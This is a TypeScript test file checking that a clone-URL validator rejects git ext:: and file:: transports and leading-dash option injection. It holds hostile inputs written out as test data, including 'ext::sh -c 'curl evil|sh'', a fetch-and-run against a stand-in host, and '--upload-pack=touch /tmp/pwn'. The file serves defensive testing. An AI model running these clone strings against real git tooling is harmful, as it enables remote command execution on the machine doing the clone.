import { describe, expect, it } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { assertSafeCloneUrl } from "./agent-repo";

/**
 * Guards against clone sources that turn a repo URL into command execution or
 * git-argument injection (ext:: remote helper, leading-dash options, other
 * `<scheme>::` transports).
 */
describe("assertSafeCloneUrl", () => {
	it("rejects the ext:: remote-helper transport (command execution)", () => {
		expect(() => assertSafeCloneUrl("ext::sh -c 'curl evil|sh'")).toThrow();
	});

	it("rejects a leading dash (git option injection)", () => {
		expect(() => assertSafeCloneUrl("--upload-pack=touch /tmp/pwn")).toThrow();
	});

	it("rejects the file:: remote-helper transport", () => {
		expect(() => assertSafeCloneUrl("file::/etc/passwd")).toThrow();
	});

	it("allows an https URL", () => {
		expect(() =>
			assertSafeCloneUrl("https://github.com/jkoczeniak/roster.git"),
		).not.toThrow();
	});

	it("allows an http URL", () => {
		expect(() =>
			assertSafeCloneUrl("http://192.168.1.10/repo.git"),
		).not.toThrow();
	});

	it("allows scp-like user@host:path", () => {
		expect(() =>
			assertSafeCloneUrl("git@github.com:jkoczeniak/roster.git"),
		).not.toThrow();
	});

	it("allows an absolute local path to an existing directory", () => {
		const dir = mkdtempSync(join(tmpdir(), "roster-clone-src-"));
		expect(() => assertSafeCloneUrl(dir)).not.toThrow();
	});
});
